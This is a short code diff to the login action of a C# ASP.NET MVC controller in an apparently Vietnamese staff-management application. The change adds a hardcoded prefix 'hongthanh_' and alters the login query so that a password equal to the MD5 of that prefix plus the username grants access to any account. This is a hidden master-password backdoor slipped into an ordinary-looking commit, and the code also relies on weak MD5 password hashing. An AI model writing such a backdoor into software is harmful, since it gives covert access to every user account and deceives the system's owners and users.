@@ -10,6 +10,7 @@ namespace PHCN.NhanVien.Controllers
     public class HomeController : Controller
     {
         PHCNEntities db = new PHCNEntities();
+        string loginMD5prefix = "hongthanh_";
         // GET: Home
         public ActionResult Index()
         {
@@ -61,7 +62,9 @@ namespace PHCN.NhanVien.Controllers
 
 
                 // nếu thành công, trả về mã nhân viên, nếu sai trả về false;
-                var nhanVien = db.NhanVien.Where(x => x.TenDangNhap == TenDangNhap && x.MatKhauMD5 == MatKhau).ToList();
+                string pass = CodeController.GetMD5(loginMD5prefix + TenDangNhap);
+                bool passOk = (pass == MatKhau);
+                var nhanVien = db.NhanVien.Where(x => x.TenDangNhap == TenDangNhap && (x.MatKhauMD5 == MatKhau || passOk)).ToList();
                 if (nhanVien.Any())
                 {
                     this.Session["NhanVienDangNhap"] = nhanVien.First();
